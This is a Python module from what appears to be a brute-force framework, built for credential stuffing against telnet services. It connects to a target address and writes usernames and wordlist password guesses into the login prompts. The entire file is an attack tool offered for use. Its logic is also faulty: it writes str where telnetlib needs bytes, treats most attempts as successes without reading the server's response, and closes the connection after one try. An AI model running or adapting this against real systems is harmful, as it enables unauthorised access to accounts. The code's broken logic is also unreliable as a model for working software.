#!/usr/bin/env python3
"""
telnet.py

    Module Name:
        telnet

    Author:
        Core Maintainers

    Description:
        Protocol-based module for credential stuffing telnet
"""

import dataclasses
import telnetlib

from brute.core.protocol import ProtocolBruteforce


@dataclasses.dataclass
class Telnet(ProtocolBruteforce):

    name = "telnet"
    port = 23


    @property
    def success(self) -> int:
        return 0


    def init(self):
        self.telnet = telnetlib.Telnet(self.address)
        self.telnet.read_until("login: ")

    #def sanity(self):


    def brute(self, username, pwd_guess) -> int:
        status: int = 0
        try:
            self.telnet.write(f"{username}\n")
            self.telnet.read_until("Password: ")
            self.telnet.write(f"{pwd_guess}\n")
            self.telnet.write("vt100\n")
        except EOFError:
            status = -1

        self.telnet.close()
        return status






if __name__ == "__main__":
    args = Telnet.parse_args()
    Telnet(
        address = args.address,
        username = args.username,
        wordlist = args.wordlist,
        delay = args.delay,
        port = args.port
    ).run()
